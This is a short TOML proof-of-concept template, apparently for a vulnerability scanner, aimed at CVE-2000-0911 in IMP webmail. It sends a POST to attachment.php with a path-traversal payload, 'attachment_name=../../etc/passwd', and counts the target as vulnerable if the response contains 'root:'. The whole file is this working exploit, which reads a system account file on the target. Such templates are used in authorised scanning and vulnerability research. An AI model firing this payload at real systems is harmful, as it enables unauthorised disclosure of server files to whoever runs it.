[info]
author = "ave"
description = "通过修改IMP附件隐藏表单变量attachment_name实现任意文件读取，验证目标是否存在未授权文件读取漏洞"
id = "POC-AVE-2000-1011"
name = "CVE-2000-0911 PoC"
severity = "medium"
tags = ["ave-2000-1011"]
vuln_id = [
    "CVE-2000-0911",
    "AVE-2000-1011",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/attachment.php"
protocol = "http"

[poc.requests.body]
content = "attachment_name=../../etc/passwd"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
